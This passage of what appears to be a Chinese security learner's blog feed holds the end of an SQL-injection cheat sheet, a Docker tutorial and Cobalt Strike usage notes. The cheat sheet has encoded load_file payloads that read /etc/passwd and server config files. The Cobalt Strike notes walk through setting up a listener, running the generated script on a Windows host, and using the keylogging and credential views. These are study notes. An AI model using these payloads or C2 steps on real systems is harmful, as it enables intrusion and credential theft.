</li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;resin-pro-3.0.22&#x2F;conf&#x2F;resin.conf 同上 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf APASHE虚拟主机查看 </li><li>&#x2F;etc&#x2F;sysconfig&#x2F;iptables 查看防火墙策略 </li><li>load_file(<strong>char</strong>(47)) 可以列出FreeBSD,Sunos系统根目录 </li><li>replace(load_file(0×2F6574632F706173737764),0×3c,0×20) </li><li>replace(load_file(<strong>char</strong>(47,101,116,99,47,112,97,115,115,119,100)),<strong>char</strong>(60),<strong>char</strong>(32))</li></ol></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2022/02/05/docker/"/>
    <url>/2022/02/05/docker/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h4 id="centos安装"><a href="#centos安装" class="headerlink" title="centos安装"></a>centos安装</h4><p>一键安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -sSL https://get.daocloud.io/docker | sh<br></code></pre></td></tr></table></figure><p>卸载以前的docker</p><blockquote><p><strong>sudo</strong> <strong>yum remove</strong> docker <br>  docker-client <br>  docker-client-latest <br>  docker-common <br>  docker-latest <br>  docker-latest-logrotate <br>  docker-logrotate <br>  docker-engine</p></blockquote><p>安装仓库</p><blockquote><p><strong>sudo</strong> <strong>yum install</strong> -y yum-utils <br>device-mapper-persistent-data <br>lvm2</p></blockquote><p>设置仓库源</p><p>阿里的</p><blockquote><p><strong>sudo</strong> yum-config-manager <br>–add-repo <br>http:**&#x2F;&#x2F;<strong>mirrors.aliyun.com</strong>&#x2F;<strong>docker-ce</strong>&#x2F;<strong>linux</strong>&#x2F;<strong>centos</strong>&#x2F;**docker-ce.repo</p></blockquote><p>清华大学的</p><blockquote><p><strong>sudo</strong> yum-config-manager <br>–add-repo <br>https:**&#x2F;&#x2F;<strong>mirrors.tuna.tsinghua.edu.cn</strong>&#x2F;<strong>docker-ce</strong>&#x2F;<strong>linux</strong>&#x2F;<strong>centos</strong>&#x2F;**docker-ce.repo</p></blockquote><p>安装最新版本的 Docker Engine-Community 和 containerd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo yum install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start docker<br></code></pre></td></tr></table></figure><h4 id="Windows安装"><a href="#Windows安装" class="headerlink" title="Windows安装"></a>Windows安装</h4><p>首先，docker和VMware不兼容，我们要相互切换就要使用命令开启或者关闭</p><blockquote><p>1.使用管理员身份打开powershell<br>2.运行命令：<br>bcdedit &#x2F;set hypervisorlaunchtype off（关闭docker）</p><p>如果想重新开启：<br>bcdedit &#x2F;set hypervisorlaunchtype auto(开启docker)</p></blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-1.png" alt="image-20220205104855807"></p><p>开启Hyper-V(用docker的话),如果要使用VMware的话就要关闭Hyper-V</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><p>run [指令] 镜像:版本 执行命令(绝对路径)</p><ul><li><p>-i:允许对容器标准输入进行交互</p></li><li><p>-t:在新容器内指定一个终端或者伪终端</p></li><li><p>-d:后台运行</p></li><li><p>–name {名称}:用来指定容器的名称</p></li><li><p>-P:将容器的内部端口映射到外部主机上</p></li><li><blockquote><p>PORTS<br>0.0.0.0:32769-&gt;5000&#x2F;tcp</p><p>这里的意思是将主机的32769映射到docker的5000端口，如果我们想要访问可以直接访问主机的32769端口</p></blockquote></li><li><p>-p [[绑定的ip:]主机端口]:[docker端口[&#x2F;[tcp|udp]]:设置docker的映射端口与主机端口的映射</p><ul><li><p>如下</p></li><li><blockquote><p>127.0.0.1:1111:3000&#x2F;tcp</p><p>127.0.0.1:1111:3000(这样就是默认tcp)</p><p>1111:3000&#x2F;tcp(默认绑定的ip为0.0.0.0)</p></blockquote></li></ul></li><li><p>–network {网络名称}:将运行的程序加入到网络中</p><ul><li><blockquote><p>首先使用docker network ls来查看所有的网络</p></blockquote></li></ul></li><li><p>-rm:退出时自动清除容器内部的文件系统</p></li><li><p>-h {hostname}:设置主机的hostname</p></li><li><p>–dns [dns的ip地址]:设置dns的IP地址</p></li><li><p>–dns-search:设置dns的搜索域</p></li></ul></li><li><p>ctrl+D或者exit可以退出镜像</p></li><li><p>ps:查看运行的镜像</p><ul><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-2.png" alt="image-20220205125336762"></li></ul></li><li><p>logs {容器的id或者容器的名称}:查看镜像的日志</p><ul><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-3.png" alt="image-20220205125731891"></li></ul></li><li><p>stop {容器的id或者容器名称}:用来停止容器</p></li><li><p>stats :docker的任务管理器</p><ul><li>-a:查看所有的</li></ul></li><li><p>pull {镜像}:下载镜像</p></li><li><p>start {容器名称或者容器id}:启动一个已经停止的容器</p></li><li><p>restart {容器名称或者容器id}:用来重启容器</p></li><li><p>attach {容器名称或者容器id}:用来进入后台的容器(如果退出的话容器也退出)</p></li><li><p>exec {容器名称或者容器id}:用来进入后台的容器(退出的话容器继续后台运行)</p></li><li><p>export {容器名称或者容器id} &gt; 位置:用来导出容器</p></li><li><p>import {容器位置} {容器名称:版本}:导入容器</p><ul><li><img src="/.com//../public/img/docker-3.png" alt="image-20220205131048139"></li></ul></li><li><p>remove -f {容器名称或者容器id}:删除容器</p></li><li><p>port {容器名称或者容器id} [端口号]:查看容器的映射关系</p><ul><li><blockquote><p>docker port adoring_stonebraker 5000</p><p>查看 adoring_stonebraker的5000的端口映射</p></blockquote></li></ul></li><li><p>top {容器名称或者容器id}:容器的任务管理器</p></li><li><p>inspect {容器名称或者容器id}:查看容器的底层信息</p></li></ul><p>&#x3D;&#x3D;容器部分&#x3D;&#x3D;</p><ul><li><p>images:显示所有的容器</p><ul><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-4.png" alt="image-20220205134517220"></li><li>如果要运行aaa可以使用这条命令 docker run aaa:v1或者使用image id也可以 docker run {镜像id}</li></ul></li><li><p>search:搜索镜像</p><ul><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-5.png" alt="image-20220205135103800"></li></ul></li><li><p>commit {容器的id} 镜像名称:版本号:更新镜像</p><ul><li>-m:描述信息</li><li>-a:作者</li><li>当我们对镜像做了修改后可以使用commit进行更新</li><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-6.png" alt="image-20220205140450696"></li></ul></li><li><p>tag image_id 镜像名称:镜像版本</p><ul><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-7.png" alt="image-20220205140646834"></li><li>使用上面的这种方法进行修改镜像</li></ul></li><li><p>&#x3D;&#x3D;build:创建一个docker镜像(暂时用不到就不做记录了)&#x3D;&#x3D;</p></li></ul><p>docker网络</p><ul><li>network <ul><li>create:创建网络</li><li>ls:列出网络</li></ul></li><li>login:登录</li><li>logout:登出</li><li>push {docker账户名&#x2F;镜像名称:镜像版本}:推送镜像到docker库</li></ul><h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><p>编辑一个dockerfile用来执行(类似于脚本文件)</p><p>文件内容如下</p><blockquote><p>FROM ubuntu</p><p>RUN echo “123”</p></blockquote><p>FROM代表导入的镜像</p><p>RUN后接运行的命令</p><p>&#x3D;&#x3D;<strong>注意</strong>:Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层,会造成镜像膨胀过大。例如:&#x3D;&#x3D;</p><p>所以可以使用\来链接多行</p><blockquote><p>FROM centos<br>RUN <strong>yum</strong> -y <strong>install</strong> <strong>wget</strong> <br> <strong>&amp;&amp;</strong> <strong>wget</strong> -O redis.tar.gz “<a href="http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;">http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</a> <br> <strong>&amp;&amp;</strong> <strong>tar</strong> -xvf redis.tar.gz</p></blockquote><p>下面是dockerfile的命令就像FROM和RUN一样</p><ul><li>COPY 源路径 目标路径:从上下文复制到容器指定路径</li><li>ADD和COPY差不多不过,add在运行tar类型文件会自动解压到目标路径</li><li>CMD:docker run的时候默认使用的命令</li><li>ENTRYPOINT :和CMD差不多但是不会被覆盖,如果想要覆盖要使用 –entrypoint</li><li>ENV :设置环境变量</li><li>ARG :设置环境变量,仅在build过程中有效</li><li>VOLUME :没看懂</li><li>EXPOSE :设置默认的端口映射</li><li>WORKDIR :设置默认的工作路径</li><li>USER {用户名}[:用户组]:指定使用该用户运行</li><li>HEALTHCHECK :用来设置docker来监控时调用的命令</li><li>LABEL :设置元数据</li><li>ONBUILD :没看懂</li></ul><h3 id="Compose"><a href="#Compose" class="headerlink" title="Compose"></a>Compose</h3><p>Compose 是用于定义和运行多容器Docker应用程序的工具。借助于Compose，用户可以使用 YML 文件来配置应用程序需要的所有服务，然后使用&#x3D;&#x3D;命令从 YML 文件配置中创建并启动所有服务&#x3D;&#x3D;。简单来说，Docker-compose可以非常方便地创建比较复杂的容器。</p><h3 id="VULHUB"><a href="#VULHUB" class="headerlink" title="VULHUB"></a>VULHUB</h3><p>项目都存储在GitHub上面，搜索相应的并且下载下来只需要下载相应的文件即可，然后运行Docker-compose即可</p><p>到该目录下面运行cmd命令，然后使用docker-compose up -d命令来拉取并运行</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/docker-8.png" alt="image-20220205165638767"></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
      <category>docker</category>
      
      <category>vulhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>虚拟机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tools help</title>
    <link href="/2022/01/22/tools-help/"/>
    <url>/2022/01/22/tools-help/</url>
    
    <content type="html"><![CDATA[<h1 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h1><h2 id="CS-Cobalt-Strike"><a href="#CS-Cobalt-Strike" class="headerlink" title="CS(Cobalt-Strike)"></a>CS(Cobalt-Strike)</h2><p>下载CS包后使用teamserver来运行</p><blockquote><p>teamserver IP（自己的） 密码</p><p>来启动一个服务</p><p>然后使用cobaltstrike来监听服务</p><p>用户名随便，端口默认即可（50050）密码是刚刚自己设置的密码用户名也是自己刚刚设置的用户名</p></blockquote><p>Cobalt Stricke-&gt;listener-&gt;add添加监听器</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-1.png" alt="image-20220218105927379"></p><p>注意这个Hosts是需要添加攻击者的ip</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-2.png" alt="image-20220218110141048"></p><p>创建完成后显示如上方的可以看出监听了80端口</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-3.png" alt="image-20220218110809529"></p><p>单机launch以后出现如下框</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311925409.png" alt="image-20220218110849052"></p><p>把脚本内容复制到一个文件中(Windows能运行的格式),之后单机ok,在Event Log选项框中就会显示监听记录,然后用Windows来执行这个文件就可以上线了</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-5" alt="image-20220218111623239"></p><p>然后就可以看出来上线了</p><p>右击该电脑后选择interact后如下框内可以输入命令（默认60秒回显一次，如果想要设置时间右击被控制的电脑选择session-&gt;sleep）,<strong>使用help可以查看所有的命令</strong></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-6.png" alt="image-20220218111744041"></p><ul><li><p>菜单栏</p><ul><li><p>CobaltStrack</p><ul><li>VPN Interfaces：设置VPN</li><li>Listeners：创建监听端口</li><li>Visuallzation：查看结果</li><li>Script Manager：加载一个脚本</li></ul></li><li><p>View</p><ul><li><p>application：显示被控制电脑的信息</p></li><li><p>credentials：可以获取密码</p></li><li><p>Downloads：从被控的电脑下载东西</p></li><li><p>EventLog：上线记录</p></li><li><p>Keystrokes：键盘记录</p></li><li><p>ProxyPivots：代理模块</p><ul><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-7.png" alt="image-20220218121457035"></li></ul></li><li><p>screenshots：截图</p></li><li><p>scriptconsole：执行脚本</p><ul><li><p>sleep语言</p><ul><li><p>e用于定义变量例如:e $a&#x3D;”haha”;</p></li><li><p>x变量输出例如:x $a;</p><ul><li>x targets():输出目标ip地址啥的</li><li>x listeners():输出监听器</li><li>x beacons():所有感染的主机信息</li><li>x downloads():显示下载信息</li><li>x sites():显示资产信息</li><li>x screenshots()显示屏幕信息</li><li>x credentials():显示凭据信息</li></ul></li><li><p>$代表变量</p></li><li><p>@代表数组例如:@arr&#x3D;@(‘a’,’b’);</p></li><li><p>load 用来加载本地的sleep文件并执行</p></li><li><p>println输出</p></li><li><p>foreach循环例如:foreach $var (@arr){println($var);}</p></li><li><p>%定义字典例如:%dic[‘aaa’]&#x3D;”asdas”;%dic[$aaa]&#x3D;”asdas”;</p></li><li><p><strong>.</strong> 字符串的衔接符号例如”aaa”.”bbbb”</p></li><li><p>reload重新加载(这个时候是只能从已经加载的文件中重新加载使用ls来查看已经加载的文件)</p></li><li><p>command w {e $var&#x3D;1;println(“you are click w”.$var);}调用的时候直接w即可,<strong>并且用help可以看到这条命令</strong></p></li><li><p>sub定义函数sub fun1{println(“111”);}fun1();</p><ul><li><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-8.png" alt="image-20220218141618775"></li></ul></li><li><p>bind绑定键盘快捷键例如bind Ctrl+o{show_message(“aaa”);elog(“bbb”);}</p></li><li><p>popup自定义菜单例如:</p><ul><li><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-9.png" alt="image-20220218143029938"></p></li><li><p>&#96;&#96;&#96;sleep<br>popup item1{<br>  item(“&amp;kkk”,{url_open(“<a href="http://www.baidu.com&quot;)}/">http://www.baidu.com&quot;)}</a>);<br>  separator();<br>  item(“&amp;vvv”,{url_open(“<a href="http://www.cctv.com&quot;)}/">http://www.cctv.com&quot;)}</a>);<br>}<br>menubar(“my popup”,”item1”);</p><p>&#x2F;&#x2F;右击添加菜单<br>popup item1{<br>menu “attack”{<br> item(“&amp;kkk”,{url_open(“<a href="http://www.baidu.com&quot;)}/">http://www.baidu.com&quot;)}</a>);<br>  separator();<br>  item(“&amp;vvv”,{url_open(“<a href="http://www.cctv.com&quot;)}/">http://www.cctv.com&quot;)}</a>);<br>  }<br>}</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span 